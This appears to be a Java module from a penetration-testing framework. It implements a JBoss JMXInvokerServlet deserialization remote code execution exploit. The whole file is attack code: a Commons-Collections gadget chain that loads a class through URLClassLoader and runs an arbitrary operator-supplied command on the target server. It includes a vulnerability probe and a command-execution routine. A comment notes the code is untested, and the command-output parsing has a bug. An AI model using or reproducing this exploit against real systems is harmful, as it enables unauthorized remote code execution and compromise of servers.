package com.orleven.tentacle.permeate.script;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.springframework.context.annotation.Scope;
import org.springframework.stereotype.Component;
import com.orleven.tentacle.core.IOC;
import com.orleven.tentacle.define.Message;
import com.orleven.tentacle.define.Permeate;
import com.orleven.tentacle.permeate.bean.ProveBean;
import com.orleven.tentacle.permeate.script.base.WebScriptBase;
import com.orleven.tentacle.util.WebUtil;


/**
 * JBoss Deserialize RCE ,尚未测试，路径需要修改
 * @author orleven
 * @date 2017年1月5日
 */
@Component
@Scope("prototype")
public class JbossDeserializeRCE  extends WebScriptBase{
	
	public JbossDeserializeRCE(){
		super();
	}
	

	@Override
	public void prove() {
		ProveBean proveBean= IOC.instance().getClassobj(ProveBean.class);
		String proveFlag = "The JBoss Deserialize Remote Code Execution Is Exist!";
		String provePayload = "echo The JBoss Deserialize Remote Code Execution Is Exist!";
		String result = "";
		try {
			Map<String, String>  httpHeaders = WebUtil.getResponseAllHeaders(WebUtil.httpGet(getWebUrl()+"/invoker/JMXInvokerServlet", getHttpHeaders()));
			if(httpHeaders==null){
				result = Message.notAvailable;
				getVulnerBean().setIsVulner(Permeate.isNotVerified);
			}
			else if (httpHeaders.get("Content-Type")!=null&&httpHeaders.get("Content-Type").indexOf("MarshalledValue") >= 0) {
				getHttpHeaders().put("Content-Type", "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue");
				String str = WebUtil.getResponseBody(WebUtil.httpPost(getTargetUrl(),getHttpHeaders(), getCommandPayload(provePayload)));
				result = str.split("==========")[1];
				if (result!=null&&result.indexOf(proveFlag)>=0) {
					getVulnerBean().setIsVulner(Permeate.isVulner);
				}else{
					getVulnerBean().setIsVulner(Permeate.isNotVulner);
				}
			}else{
				getVulnerBean().setIsVulner(Permeate.isNotVulner);
			}
		} catch (Exception e) {
			result = Message.notAvailable;
			getVulnerBean().setIsVulner(Permeate.isNotVerified);
			e.printStackTrace();
		} finally{
			proveBean.setReceiveMessage(result);
			proveBean.setSendMessage(provePayload);
			getVulnerBean().getProveBean().add(proveBean);
		}
	}
	
	@Override
	public void execCommand(String command) {
		ProveBean proveBean= IOC.instance().getClassobj(ProveBean.class);
		String result = "";
		try {
			String str = WebUtil.getResponseBody(WebUtil.httpPost(getWebUrl()+"/invoker/JMXInvokerServlet",getHttpHeaders(), getCommandPayload(command)));
			if (str!=null) {
				result = result.substring(result.indexOf("==========")+10);
			}
		} catch (Exception e) {
			e.printStackTrace();
		} finally{
			proveBean.setReceiveMessage(result);
			proveBean.setSendMessage(command);
			getVulnerBean().getProveBean().add(proveBean);
		}
	}
	
	/**
	 * 生成执行指定命令的payload
	 * @param command
	 * @return
	 * @throws Exception
	 */
	private byte[] getCommandPayload(String command) throws Exception {
		String ClassPath = "file:../.readme.html.tmp";
		Transformer transforms[] = { new ConstantTransformer(URLClassLoader.class),
				new InvokerTransformer("getConstructor", new Class[] { Class[].class },
						new Object[] { new Class[] { java.net.URL[].class } }),
				new InvokerTransformer("newInstance", new Class[] { Object[].class },
						new Object[] { new Object[] { new URL[] { new URL(ClassPath) } } }),
				new InvokerTransformer("loadClass", new Class[] { String.class },
						new Object[] { "com.payload.RunCommand" }),
				new InvokerTransformer("getConstructor", new Class[] { Class[].class },
						new Object[] { new Class[] { String.class } }),
				new InvokerTransformer("newInstance", new Class[] { Object[].class },
						new Object[] { new String[] { command } }) };
		Transformer transformerChain = new ChainedTransformer(transforms);
		Map innermap = new HashMap();
		innermap.put("value", "value");
		Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
		Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
		Constructor ctor = cls.getDeclaredConstructor(new Class[] { Class.class, java.util.Map.class });
		ctor.setAccessible(true);
		Object instance = ctor.newInstance(new Object[] { Retention.class, outmap });
		ByteArrayOutputStream bo = new ByteArrayOutputStream(10);
		ObjectOutputStream out = new ObjectOutputStream(bo);
		out.writeObject(instance);
		out.flush();
		out.close();
		return bo.toByteArray();
	}


}
